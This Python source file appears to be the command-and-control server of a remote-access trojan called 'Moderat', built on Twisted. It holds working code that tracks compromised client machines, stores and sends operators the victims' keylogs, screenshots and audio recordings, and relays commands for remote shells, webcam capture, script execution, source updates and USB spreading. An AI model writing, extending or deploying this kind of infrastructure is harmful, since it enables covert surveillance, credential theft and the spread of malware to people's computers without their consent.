import ast
import logging
import coloredlogs
import os
import datetime
import time

from twisted.internet.protocol import ServerFactory
from twisted.internet import task
from twisted.protocols.basic import LineReceiver

from db.DatabaseManagment import MDB
from commands import client


class ModeratServerProtocol(LineReceiver):

    delimiter = '[ENDOFMESSAGE]'
    MAX_LENGTH = 1024 * 1024 * 100  # 100MB

    def __init__(self):

        # dicts for download
        self.screenshots_dict = {}
        self.keylogs_dict = {}
        self.audio_dict = {}

    def rawDataReceived(self, data):
        pass

    # New Connection Made
    def connectionMade(self):
        self.send_message(self, 'connectSuccess', 'connectSuccess')

    def connectionLost(self, reason):
        self.transport.abortConnection()

        # Delete Socket Entry
        for key, value in self.factory.clients.items():
            if value['socket'] == self:
                self.factory.database.set_client_offline(key)
                del self.factory.clients[key]
                self.factory.log.warning('[CLIENT] Client (%s) Disconnected' % (value['key'] if value.has_key('key') else 'UNKNOWN'))

        # Delete Moderator Entry
        try:
            for key, value in self.factory.moderators.items():
                if value['socket'] == self:
                    # Set Moderator Offline
                    self.factory.database.set_status(value['username'], 0)
                    self.factory.log.warning('[MODERATOR] Moderator (%s) Disconnected' % value['username'])
                    del self.factory.moderators[key]
        except KeyError:
            pass

    def lineLengthExceeded(self, line):
        self.factory.log.warning('[SERVER] Data Length Exceeded from {}'.format(self.transport.getPeer().host))

    def lineReceived(self, line):
        try:
            command = ast.literal_eval(line)
        except SyntaxError:
            return

        # Switch to client commands
        if command['from'] == 'client':
            if not command['mode'] == 'infoChecker':
                self.factory.log.info('[*RECV] [Client: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
            if command.has_key('module_id'):
                client.CheckCommand(self, command['payload'], command['mode'], command['session_id'], command['key'],
                                     command['module_id'])
            else:
                client.CheckCommand(self, command['payload'], command['mode'], command['session_id'], command['key'], '')
        # Switch to moderator commands
        elif command['from'] == 'moderator':
            if not command['mode'] == 'getModerators' and not command['mode'] == 'getClients':
                self.factory.log.info('[*RECV] [Moderator: %s] [Mode: (%s)]' % (self.transport.getPeer().host, command['mode']))
            self.moderator_commands(command['payload'], command['mode'], command['session_id'], command['to'],
                                    command['module_id'])

    # Moderator Commands
    def moderator_commands(self, payload, mode, session_id, client_key, module_id):
        if mode == 'moderatorInitializing':

            # Initializing Moderator
            self.factory.log.debug('[MODERATOR] Initializing Moderator [FROM: %s]' % self.transport.getPeer().host)
            if payload.startswith('auth '):
                credentials = payload.split()
                if len(credentials) == 3:
                    command, username, password = payload.split()

                    # If Login Success
                    if self.factory.database.login_user(username, password):
                        privileges = self.factory.database.get_privs(username)
                        self.send_message(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')
                        self.factory.moderators[session_id] = {'username': username, 'socket': self}
                        self.factory.database.set_last_online(username, datetime.datetime.now())
                        self.factory.database.set_status(username, 1)

                        self.factory.log.debug('[MODERATOR] Moderator (%s) Login Success' % username)

                    # if Login Not Success
                    else:
                        self.send_message(self, 'loginError', 'moderatorInitializing')
                        self.factory.log.error('[MODERATOR] Moderator (%s) Login Error' % username)

                else:
                    self.factory.log.critical('[MALFORMED] Moderator Login Data')

        # Initialized Moderator
        elif self.factory.moderators.has_key(session_id):

            moderator_username = self.factory.moderators[session_id]['username']

            if mode == 'getClients' and session_id in self.factory.moderators:

                if self.factory.database.get_privs(moderator_username) == 1:
                    clients_ids = []
                    temp_clients_ids = self.factory.database.get_all_clients()
                    for client_id in temp_clients_ids:
                        _id = client_id[0]
                        if self.factory.database.get_privs(self.factory.database.get_moderator(
                                _id)) == 0 or moderator_username == self.factory.database.get_moderator(_id):
                            clients_ids.append(client_id)
                else:
                    clients_ids = self.factory.database.get_clients(moderator_username)
                shared_clients = {}

                # for online clients
                for client_id in clients_ids:
                    _id = client_id[0]
                    # Online Clients
                    if self.factory.clients.has_key(_id) and self.factory.clients[_id].has_key('os_type'):
                        shared_clients[_id] = {
                            'moderator': self.factory.database.get_moderator(_id),
                            'alias': self.factory.database.get_alias(_id),
                            'ip_address': self.factory.clients[_id]['ip_address'],
                            'os_type': self.factory.clients[_id]['os_type'],
                            'os': self.factory.clients[_id]['os'],
                            'user': self.factory.clients[_id]['user'],
                            'privileges': self.factory.clients[_id]['privileges'],
                            'audio_device': self.factory.clients[_id]['audio_device'],
                            'webcamera_device': self.factory.clients[_id]['webcamera_device'],
                            'window_title': self.factory.clients[_id]['window_title'],
                            'key': self.factory.clients[_id]['key'],
                            'kts': self.factory.clients[_id]['kts'],
                            'kt': self.factory.clients[_id]['kt'],
                            'ats': self.factory.clients[_id]['ats'],
                            'at': self.factory.clients[_id]['at'],
                            'sts': self.factory.clients[_id]['sts'],
                            'std': self.factory.clients[_id]['std'],
                            'st': self.factory.clients[_id]['st'],
                            'usp': self.factory.clients[_id]['usp'],
                            'status': True
                        }
                    # Offline Clients
                    else:
                        shared_clients[_id] = {
                            'moderator': self.factory.database.get_moderator(_id),
                            'key': _id,
                            'alias': self.factory.database.get_alias(_id),
                            'ip_address': self.factory.database.get_ip_address(_id),
                            'last_online': self.factory.database.get_last_online(_id),
                            'status': False
                        }
                self.send_message(self, shared_clients, 'getClients')

            # Note Save Mode
            elif mode == 'saveNote':
                splitted = payload.split('%SPLITTER%')
                if len(splitted) == 2:
                    client_id, note_body = splitted
                    self.factory.database.save_note(client_id, note_body)

            # Get Note
            elif mode == 'getNote':
                self.send_message(self, '{}'.format(self.factory.database.get_note(payload)), mode, module_id=module_id)

            # Set Alias For Client
            elif mode == 'setAlias':
                alias_data = payload.split()
                try:
                    alias_client = alias_data[0]
                    alias_value = u' '.join(alias_data[1:])
                    self.factory.log.debug('[MODERATOR][{0}] Add Alias ({1}) for ({2})'.format(moderator_username, alias_value,
                                                                                   self.transport.getPeer().host))
                    self.factory.database.set_alias(alias_client, alias_value)
                except:
                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator_username, mode))

            elif mode == 'removeClient':
                client = payload
                self.factory.database.delete_client(client)
                self.factory.log.debug('[MODERATOR][{0}] Client ({1}) Removed'.format(moderator_username, client))

            elif mode == 'countData':
                screen_data = payload.split()
                if len(screen_data) == 2:
                    client_id, date = screen_data
                    counted_data = {
                        'screenshots': {
                            'new': self.factory.database.get_screenshots_count_0(client_id, date),
                            'old': self.factory.database.get_screenshots_count_1(client_id, date)
                        },
                        'keylogs': {
                            'new': self.factory.database.get_keylogs_count_0(client_id, date),
                            'old': self.factory.database.get_keylogs_count_1(client_id, date)
                        },
                        'audio': {
                            'new': self.factory.database.get_audios_count_0(client_id, date),
                            'old': self.factory.database.get_audios_count_1(client_id, date)
                        }
                    }

                    self.send_message(self, counted_data, mode, module_id=module_id)
                else:
                    self.factory.log.critical('[MALFORMED][{0}] [MODE: {1}]'.format(moderator_username, mode))

            elif mode == 'downloadLogs':
                if type(payload) == dict:
                    download_info = payload
                    # Get All Logs
                    if download_info['screenshot']:
                        screenshots = self.factory.database.get_all_new_screenshots(download_info['client_id'],
                                                                                download_info['date']) \
                            if download_info['filter'] else self.factory.database.get_all_screenshots(
                            download_info['client_id'], download_info['date'])
                    else:
                        screenshots = []
                    if download_info['keylog']:
                        keylogs = self.factory.database.get_all_new_keylogs(download_info['client_id'], download_info['date']) \
                            if download_info['filter'] else self.factory.database.get_all_keylogs(download_info['client_id'],
                                                                                          download_info['date'])
                    else:
                        keylogs = []
                    if download_info['audio']:
                        audios = self.factory.database.get_all_new_audios(download_info['client_id'], download_info['date']) \
                            if download_info['filter'] else self.factory.database.get_all_audios(download_info['client_id'],
                                                                                       download_info['date'])
                    else:
                        audios = []

                    # Send Counted Logs
                    counted_logs = {
                        'screenshots': len(screenshots),
                        'keylogs': len(keylogs),
                        'audios': len(audios),
                    }
                    self.send_message(self, counted_logs, mode, module_id=module_id)

                    # Start Send Screenshots
                    for screenshot in screenshots:
                        if os.path.exists(screenshot[2]):
                            screenshot_info = {
                                'type': 'screenshot',
                                'datetime': screenshot[1],
                                'raw': open(screenshot[2], 'rb').read(),
                                'window_title': screenshot[3],
                                'date': screenshot[4]
                            }
                            self.send_message(self, screenshot_info, 'downloadLog', module_id=module_id)
                            self.factory.database.set_screenshot_viewed(screenshot[1])
                        else:
                            self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % screenshot[2])
                            self.factory.database.delete_screenshot(screenshot[1])

                    # Start Send Keylogs
                    for keylog in keylogs:
                        if os.path.exists(keylog[3]):
                            keylog_info = {
                                'type': 'keylog',
                                'datetime': keylog[1],
                                'date': keylog[2],
                                'raw': open(keylog[3], 'rb').read()
                            }
                            self.send_message(self, keylog_info, 'downloadLog', module_id=module_id)
                            self.factory.database.set_keylog_viewed(keylog[1])
                        else:
                            self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % keylog[3])
                            self.factory.database.delete_keylog(keylog[1])

                    # Start Send Audios
                    for audio in audios:
                        if os.path.exists(audio[3]):
                            audio_info = {
                                'type': 'audio',
                                'datetime': audio[1],
                                'date': audio[2],
                                'raw': open(audio[3], 'rb').read()
                            }
                            self.send_message(self, audio_info, 'downloadLog', module_id=module_id)
                            self.factory.database.set_audio_viewed(audio[1])
                        else:
                            self.factory.log.info('[SERVER] File Not Found Delete Entry (%s)' % audio[3])
                            self.factory.database.delete_audios(audio[1])

                    self.send_message(self, {'type': 'endDownloading', }, 'downloadLog', module_id=module_id)
                else:
                    self.factory.log.critical('[MALFORMED][TYPE] [MODE: {0}] [TYPE: {1}]'.format(mode, type(payload)))

            # Get Moderators List
            elif mode == 'getModerators' and self.factory.database.get_privs(moderator_username) == 1:
                all_moderators = self.factory.database.get_moderators()
                result = {}
                for moderator in all_moderators:
                    all_clients_count = len(self.factory.database.get_clients(moderator[0]))
                    offline_clients_count = len(self.factory.database.get_offline_clients(moderator[0]))
                    result[moderator[0]] = {
                        'privileges': moderator[2],
                        'offline_clients': offline_clients_count,
                        'online_clients': all_clients_count - offline_clients_count,
                        'status': moderator[3],
                        'last_online': moderator[4],
                    }
                self.send_message(self, result, 'getModerators')

            # ADMIN PRIVILEGES
            # Add Moderator
            elif mode == 'addModerator' and self.factory.database.get_privs(moderator_username) == 1:
                credentials = payload.split()
                if len(credentials) == 3:
                    username, password, privileges = credentials
                    self.factory.database.create_user(username, password, int(privileges))
                    self.factory.log.debug('[MODERATOR][{0}] ({1}) Created With Password: ({2}), Privileges: ({3})'.format(
                        moderator_username, username, password.replace(password[3:], '***'), privileges))

            elif mode == 'setModerator' and self.factory.database.get_privs(moderator_username) == 1:
                credentials = payload.split()
                if len(credentials) == 2:
                    client_id, moderator_id = credentials
                    self.factory.database.set_moderator(client_id, moderator_id)
                    self.factory.log.debug('[MODERATOR][{0}] Moderator Changed For Client ({1}) to ({2})'.format(
                        moderator_username, client_id, moderator_id))

            elif mode == 'changePassword' and self.factory.database.get_privs(moderator_username) == 1:
                credentials = payload.split()
                if len(credentials) == 2:
                    moderator_id, new_password = credentials
                    self.factory.database.change_password(moderator_id, new_password)
                    self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Password Changed to ({2})'.format(
                        moderator_username, moderator_id, new_password.replace(new_password[3:], '***')))

            elif mode == 'changePrivilege' and self.factory.database.get_privs(moderator_username) == 1:
                credentials = payload.split()
                if len(credentials) == 2:
                    moderator_id, new_privilege = credentials
                    self.factory.database.change_privileges(moderator_id, new_privilege)
                    self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Privilege Changed to ({2})'.format(
                        moderator_username, moderator_id, new_privilege))

            elif mode == 'removeModerator' and self.factory.database.get_privs(moderator_username) == 1:
                moderator_id = payload
                self.factory.database.delete_user(moderator_id)
                self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Removed'.format(
                    moderator_username, moderator_id))

            # For Only Administrators
            elif mode in ['terminateClient'] and self.factory.database.get_privs(moderator_username) == 1:
                self.send_message(self.factory.clients[client_key]['socket'], payload, mode,
                                            session_id=session_id)

            # Forward To Client
            elif mode in ['getScreen', 'getWebcam', 'setLogSettings', 'updateSource', 'p2pMode',
                          'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode', 'usbSpreading']:
                try:
                    self.send_message(self.factory.clients[client_key]['socket'], payload, mode,
                                                session_id=session_id, module_id=module_id)
                except KeyError as e:
                    pass
            else:
                self.factory.log.critical('[MALFORMED][MODE] [MODE: {0}] [MODERATOR: {1}]'.format(moderator_username, mode))
        else:
            self.factory.log.critical('[MALFORMED][SESSION] [MODE: {0}] [SESSION: {1}]'.format(mode, session_id))

    # Send Message To Client
    def send_message(self, to, message, mode, session_id='', module_id='', end='[ENDOFMESSAGE]'):
        # Send Data Function
        to.transport.write(str({
            'payload': message,
            'mode': mode,
            'from': 'server',
            'session_id': session_id,
            'module_id': module_id,
        }) + end)
        self.factory.log.info('[*SENT] [TO: %s] [FROM: %s] [MODE: %s]' % (
        to.transport.getPeer().host, self.transport.getPeer().host, mode))


class ModeratServerFactory(ServerFactory):

    # Custom Colored Logging
    log = logging.getLogger('Moderat')
    coloredlogs.install(level='DEBUG')

    DATA_STORAGE = r'/media/root/STORAGE/MODERAT_DATA/'
    database = MDB()

    # Clear Clients and Moderators Status
    database.set_client_status_zero()
    database.set_moderator_status_zero()

    moderators = {}
    clients = {}

    log.debug('[SERVER] Moderat Server Started')
    protocol = ModeratServerProtocol

    def __init__(self):
        self.clientInfoChecker = task.LoopingCall(self.infoChecker)
        self.clientInfoChecker.start(5)

    def infoChecker(self, session_id='', module_id='', end='[ENDOFMESSAGE]'):
        for key in self.clients.keys():
            client = self.clients[key]['socket']
            client.transport.write(str({
            'payload': 'infoChecker',
            'mode': 'infoChecker',
            'from': 'server',
            'session_id': session_id,
            'module_id': module_id,
            }) + end)